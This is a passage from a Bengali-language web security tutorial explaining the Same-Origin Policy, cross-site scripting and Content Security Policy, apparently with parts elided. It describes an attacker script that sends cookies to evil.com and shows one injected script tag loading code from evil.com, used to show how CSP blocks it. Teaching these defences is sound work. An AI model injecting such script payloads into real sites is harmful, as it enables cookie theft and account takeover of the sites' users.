...
```
যখন তুমি bank.com এর account path এর data পড়তে যাবে evil.com এর javascript এর মাধ্যমে তখন SOP এখানে বলে: **“থামো, তোমরা দুইজনতো আলাদা origin।
তুমি bank.com এর ডাটা দেখতে বা পড়তে পারবে না।”**

এটা না থাকলে, যেকোনো ম্যালিসিয়াস সাইট থেকে ব্যাংকের ডাটা দেখে নিতে পারত এবং লুটার চেষ্টা করতো।
...
ধরো তোমার সাইটে কোনো ইনপুট ফিল্ডে একজন attacker নিচের মতো JS code inject করল:
...
এই স্ক্রিপ্ট যদি সফলভাবে চলতে(Run) পারে → তাহলে কুকি চলে যাবে evil.com এ এবং এই কুকি থাকবে ওয়েবসাইট এর log এ। এটাই XSS।
...
এবার যদি attacker এই script তোমার ওয়েবসাইটের কোনো input field যেখান থেকে ক্লায়েন্ট এর কাছ থেকে ডাটা নেয় এমন সব জায়গায় ঢোকায়:

```html
<script src="https://evil.com/x.js"></script>
```

তাহলে ব্রাউজার সরাসরি বলবে: **“না, CSP allow করে নাই।”** সুতরাং script রান করবে না।
